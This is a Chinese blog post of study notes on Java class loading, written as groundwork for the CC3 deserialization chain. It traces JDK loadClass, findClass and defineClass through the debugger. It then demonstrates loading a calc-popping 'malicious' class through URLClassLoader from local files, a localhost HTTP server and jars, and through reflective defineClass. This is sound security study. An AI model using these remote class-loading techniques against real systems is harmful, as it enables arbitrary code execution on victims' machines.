---
title: "cc3链学习"
date: "2026-11-01 21:30:07"
updated: "2026-11-01 21:30:07"
permalink: "2026/11/01/cc3-classloading/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC3"]
description: "CC3 学习前的类加载基础笔记：loadClass、findClass、defineClass，以及本地和远程加载实验。"
excerpt: "CC3 学习前的类加载基础笔记：loadClass、findClass、defineClass，以及本地和远程加载实验。"
obsidian_source: "cc3链学习.md"
---

## CC3 学习前的准备

cc3链和之前就完全不同了，在正式开始学习cc3之前你首先要搞明白类加载的过程，我看了一个视频简直像听天书一样，还是要自己跟进去看一下，接下来我们深入代码研究一下底层类加载的过程

```java
//        获取当前使用的类加载器  
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();  
//        加载类并获取返回的Class对象  
        Class<?> aClass = systemClassLoader.loadClass("TestClass");  
//        实例化  
        aClass.newInstance();
```

## 断点追踪类加载过程

我们在加载类这一行设置断点强制步入进入jdk的内部观察原理
首先来到了Classloader类的loadclass方法
我们事先已经知道我们获取当前使用的类加载器应该是launcher里面的appclassloader，但是我们为什么首先进入了classloader呢，因为app里面loadclass要求传入两个参数我们只传入了一个所以首先进入他的父类返回两个参数之后在传给他
```java
public Class<?> loadClass(String name) throws ClassNotFoundException {  
    return loadClass(name, false);  
}
```
接着步入进入了launcher里面的loadclass
```java
public Class<?> loadClass(String name, boolean resolve)  
    throws ClassNotFoundException  
{  
    int i = name.lastIndexOf('.');  
    if (i != -1) {  
        SecurityManager sm = System.getSecurityManager();  
        if (sm != null) {  
            sm.checkPackageAccess(name.substring(0, i));  
        }  
    }  
  
    if (ucp.knownToNotExist(name)) {  
        // The class of the given name is not found in the parent  
        // class loader as well as its local URLClassPath.        // Check if this class has already been defined dynamically;        // if so, return the loaded class; otherwise, skip the parent        // delegation and findClass.        Class<?> c = findLoadedClass(name);  
        if (c != null) {  
            if (resolve) {  
                resolveClass(c);  
            }  
            return c;  
        }  
        throw new ClassNotFoundException(name);  
    }  
  
    return (super.loadClass(name, resolve));  
}
```
knownToNotExist这个方法会对获取到的类名进行一个缓存检查看是否有缓存且可以被使用，具体代码在URLclasspath里面
```java
synchronized boolean knownToNotExist(String name) {
    return this.lookupCacheURLs != null && lookupCacheEnabled
        ? knownToNotExist0(this.lookupCacheLoader, name)
        : false;
}
```
如果这个类没有缓存或者缓存不可用则返回flase接着进行查询操作

接着运行到return (super.loadClass(name, resolve)); ，我们发现他会把内容重新交给他的父类，这也是我们看到他在转圈的原因

在进行一些安全检查之后我们发现他有调用了父类的loadclass
又回到了classloader里面，怎么在转圈啊

```java
protected Class<?> loadClass(String name, boolean resolve)  
    throws ClassNotFoundException  
{  
    synchronized (getClassLoadingLock(name)) {  
        // First, check if the class has already been loaded  
        Class<?> c = findLoadedClass(name);  
        if (c == null) {  
            long t0 = System.nanoTime();  
            try {  
                if (parent != null) {  
                    c = parent.loadClass(name, false);  
                } else {  
                    c = findBootstrapClassOrNull(name);  
                }  
            } catch (ClassNotFoundException e) {  
                // ClassNotFoundException thrown if class not found  
                // from the non-null parent class loader            }  
  
            if (c == null) {  
                // If still not found, then invoke findClass in order  
                // to find the class.                long t1 = System.nanoTime();  
                c = findClass(name);  
  
                // this is the defining class loader; record the stats  
                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);  
                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);  
                sun.misc.PerfCounter.getFindClasses().increment();  
            }  
        }  
        if (resolve) {  
            resolveClass(c);  
        }  
        return c;  
    }  
}
```
```java
protected Object getClassLoadingLock(String className) {  
    Object lock = this;  
    if (parallelLockMap != null) {  
        Object newLock = new Object();  
        lock = parallelLockMap.putIfAbsent(className, newLock);  
        if (lock == null) {  
            lock = newLock;  
        }  
    }  
    return lock;  
}
```
首先进入这个方法中，我们看注释可以知道这个方法是检查这个类是否被加载过
这段代码是获取加载某个类的时候使用的锁对象，暂时先不了解这个
跳过接着进行代码
然后进入findloadclass
```java
protected final Class<?> findLoadedClass(String name) {  
    if (!checkName(name))  
        return null;  
    return findLoadedClass0(name);  
}
```
很明显从字面上看进行名称的检查，进入checkname的方法
```java
private boolean checkName(String name) {  
    if ((name == null) || (name.length() == 0))  
        return true;  
    if ((name.indexOf('/') != -1)  
        || (!VM.allowArraySyntax() && (name.charAt(0) == '[')))  
        return false;  
    return true;  
}
```
就当学习java了，name为空可以返回true，带/不支持数组语法的时候不允许[]，然后检查完成
这个类没有被加载过所以返回null，继续委派查询
```java
protected Class<?> loadClass(String name, boolean resolve)  
    throws ClassNotFoundException  
{  
    synchronized (getClassLoadingLock(name)) {  
        // First, check if the class has already been loaded  
        Class<?> c = findLoadedClass(name);  
        if (c == null) {  
            long t0 = System.nanoTime();  
            try {  
                if (parent != null) {  
                    c = parent.loadClass(name, false);  
                } else {  
                    c = findBootstrapClassOrNull(name);  
                }  
            } catch (ClassNotFoundException e) {  
                // ClassNotFoundException thrown if class not found  
                // from the non-null parent class loader            }  
  
            if (c == null) {  
                // If still not found, then invoke findClass in order  
                // to find the class.                long t1 = System.nanoTime();  
                c = findClass(name);  
  
                // this is the defining class loader; record the stats  
                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);  
                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);  
                sun.misc.PerfCounter.getFindClasses().increment();  
            }  
        }  
        if (resolve) {  
            resolveClass(c);  
        }  
        return c;  
    }  
}
```

## 委派与 findClass

这里是关键代码再贴出来一遍方便查看
我们现在就开始进入双亲委派的流程了，不过不应该叫双亲委派应该叫单亲委派，自己没加载就请求要父加载器加载
按照双亲委派的流程我们这个例子应该是由应用加载器交给扩展类加载器，扩展类加载器交给启动类加载器
接着我们看代码，c为null，然后由parent执行loadclass，我们发下他执行是按照一样的代码又走了一遍，虽然代码一样但实际执行查找的位置是不一样的
然后进入启动类加载器，当然啦最终还是没有找到代码接着往下走
```java
if (c == null) {  
                // If still not found, then invoke findClass in order  
                // to find the class.                long t1 = System.nanoTime();  
                c = findClass(name);  
                
```
从这个代码里我们进入了urlclassloader
为什么会进入这个类呢？
我们知道appclassloader和extclassloader都是launcher这个类里面的内部静态类，我们可以很明显的看到这个静态类是直接继承自urlclassloader的
```java
static class AppClassLoader extends URLClassLoader {
```
因为这里面没有重写findclass这个方法，所以去到了他的父类
```java
protected Class<?> findClass(final String name)  
    throws ClassNotFoundException  
{  
    final Class<?> result;  
    try {  
        result = AccessController.doPrivileged(  
            new PrivilegedExceptionAction<Class<?>>() {  
                public Class<?> run() throws ClassNotFoundException {  
                    String path = name.replace('.', '/').concat(".class");  
                    Resource res = ucp.getResource(path, false);  
                    if (res != null) {  
                        try {  
                            return defineClass(name, res);  
                        } catch (IOException e) {  
                            throw new ClassNotFoundException(name, e);  
                        }  
                    } else {  
                        return null;  
                    }  
                }  
            }, acc);  
    } catch (java.security.PrivilegedActionException pae) {  
        throw (ClassNotFoundException) pae.getException();  
    }  
    if (result == null) {  
        throw new ClassNotFoundException(name);  
    }  
    return result;  
}
```
这段代码的寻找方式是把点换成/再后面加上class，去寻找这个文件，存在就读取字节码进行定义，找不到就抛出错误
```java
public Resource getResource(String name, boolean check) {
    Loader loader;
    int[] cache = getLookupCache(name);

    for (int i = 0;
         (loader = getNextLoader(cache, i)) != null;
         i++) {

        Resource res = loader.getResource(name, check);

        if (res != null) {
            return res;
        }
    }

    return null;
}
```
找到则返回找不到返回null
但是我们发现返回的结果是null，为什么找不到呢，因为我们现在的加载器是扩展类加载器
应该是到应用类加载器的时候才可以找到
然后到应用类加载器的时候进入defineclass里面
```java
private Class<?> defineClass(String name, Resource res) throws IOException {  
    long t0 = System.nanoTime();  
    int i = name.lastIndexOf('.');  
    URL url = res.getCodeSourceURL();  
    if (i != -1) {  
        String pkgname = name.substring(0, i);  
        // Check if package already loaded.  
        Manifest man = res.getManifest();  
        definePackageInternal(pkgname, man, url);  
    }  
    // Now read the class bytes and define the class  
    java.nio.ByteBuffer bb = res.getByteBuffer();  
    if (bb != null) {  
        // Use (direct) ByteBuffer:  
        CodeSigner[] signers = res.getCodeSigners();  
        CodeSource cs = new CodeSource(url, signers);  
        sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);  
        return defineClass(name, bb, cs);  
    } else {  
        byte[] b = res.getBytes();  
        // must read certificates AFTER reading bytes.  
        CodeSigner[] signers = res.getCodeSigners();  
        CodeSource cs = new CodeSource(url, signers);  
        sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);  
        return defineClass(name, b, 0, b.length, cs);  
    }  
}
```
我们可以看到最后是返回一个defineclass
然后我们发现进入了secureclassloader
```java
    return defineClass(name, b, off, len, getProtectionDomain(cs));  
}
```
依旧是返回defineclass，参数不同
又进入了他的父类classloader
```java
protected final Class<?> defineClass(String name, byte[] b, int off, int len,  
                                     ProtectionDomain protectionDomain)  
    throws ClassFormatError  
{  
    protectionDomain = preDefineClass(name, protectionDomain);  
    String source = defineClassSourceLocation(protectionDomain);  
    Class<?> c = defineClass1(name, b, off, len, protectionDomain, source);  
    postDefineClass(c, protectionDomain);  
    return c;  
}
```
```java
private native Class<?> defineClass0(String name, byte[] b, int off, int len,  
                                     ProtectionDomain pd);  
  
private native Class<?> defineClass1(String name, byte[] b, int off, int len,  
                                     ProtectionDomain pd, String source);  
  
private native Class<?> defineClass2(String name, java.nio.ByteBuffer b,  
                                     int off, int len, ProtectionDomain pd,  
                                     String source);
```
这些就是加载类的具体代码
然后就是把结果不断返回，类加载终于结束了

## 本地和远程加载实验

我们理解清楚之后就可以尝试远程加载class文件了，这才是我们想干的事情，我们是勾八黑客

接下来尝试加载恶意类，先编写一个恶意类编译之后放在c盘的src的文件夹中
```java
package src;  
  
import java.io.IOException;  
  
// URLClassLoader 的 file 协议  
public class Calc {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
 } catch (IOException e){  
            e.printStackTrace();  
 }  
    }  
}
```
然后在本项目中尝试加载它
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("file:///C:/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```
显然成功了要是不成功我就不把代码放在上面了
接下来是远程加载恶意类
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:1233/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```
成功弹出计算器
使用jar
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("jar:file:///C:/src/Calc.jar!/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```
http+jar
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("jar:http://127.0.0.1:1233/Calc.jar!/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```

## 梳理 loadClass、findClass 与 defineClass

现在我们重新梳理一下这里涉及到的三个关键方法
loadclass：从已经加载的类里面去寻找
findclass：按照URL指定的方式去寻找
defineclass：处理前面传递回来的字节码加载类
接下来我们尝试直接调用defineclass来直接加载我们的恶意类
```java
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
//        由于defineclass是一个受保护的方法，因此我们只能通过反射调用，所以我们获取加载器来获取Class来反射调用  
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();  
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);  
        defineClass.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("C://src/Calc.class"));  
        Class calcclass = (Class) defineClass.invoke(systemClassLoader, "src.Calc", bytes, 0, bytes.length);  
        calcclass.newInstance();  
    }  
}

```

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/)
